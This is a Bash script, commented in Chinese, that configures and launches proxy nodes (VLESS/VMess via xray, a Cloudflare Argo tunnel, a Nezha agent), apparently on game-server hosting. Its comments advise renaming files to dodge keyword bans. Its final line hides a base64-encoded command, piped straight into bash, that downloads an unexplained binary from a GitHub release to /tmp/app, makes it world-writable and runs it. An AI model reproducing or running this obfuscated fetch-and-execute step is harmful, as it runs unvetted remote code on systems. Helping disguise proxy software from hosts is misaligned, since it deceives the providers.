#!/bin/bash

# 设置固定隧道参数 (不设置则使用临时隧道，固定隧道设置端口8002,协议vless,ws,tls,路径vls)
# json获取地址https://fscarmen.cloudflare.now.cc
export TOK=${TOK:-''}  # json或token,支持直接复制cloudflared.exe service开头全部
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}  # 固定隧道域名


# 设置哪吒参数(NEZHA_TLS='1'开启tls,设置0关闭tls)
export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}


# 设置端口，优选，节点名称等
export UUID=${UUID:-'fd80f56e-93f3-4c85-b2a8-c77216c509a7'} #若去掉这个设置则可使用随机
export VL_PORT=${VL_PORT:-'8002'}  # vless端口
export VM_PORT=${VM_PORT:-'8001'} # vmess端口
export CF_IP=${CF_IP:-'ip.sb'}  # 优选ip
export SUB_NAME=${SUB_NAME:-'argo'}  # 节点名称

# 设置节点协议(可选vls,vms,rel)及reality参数,注意reality不螚开游戏
export TMP_ARGO=${TMP_ARGO:-'vls'}  #设置节点使用的协议，默认即vless，需要vmess填vms
export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}" #端口不能被占，所以不能同时开游戏，nodejs,python等端口也要改成别的
export SNI=${SNI:-'www.apple.com'} # tls网站

# 设置3件套文件名称，防止关键词封禁，建议修改
export ne_file=${ne_file:-'neznengh.js'} # 哪吒
export cff_file=${cff_file:-'cffhjpv.js'} # 隧道
export web_file=${web_file:-'websjphg.js'} # xry

# 设置是否启动游戏或是否显示日志
# 复制原来的启动命令并改启动文件名为senver.jar填入下面即可启动游戏，填入sleep 1即可不显示日志
# export JAR_SH='java -jar senver.jar' # 去掉#号启用，启用后节点信息不显示，只显示游戏启动信息


# 启动脚本
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
bmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAt
cU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZv
dW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgMzAKICAgICAg
ICBleGl0IDEKZmkKCmFyY2g9JCh1bmFtZSAtbSkKaWYgW1sgJGFyY2ggPT0gIng4Nl82NCIgXV07
IHRoZW4KJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25v
ZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gL3RtcC9hcHAKZWxzZQokRE9XTkxP
QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
IC90bXAvYXBw
" | base64 -d | bash
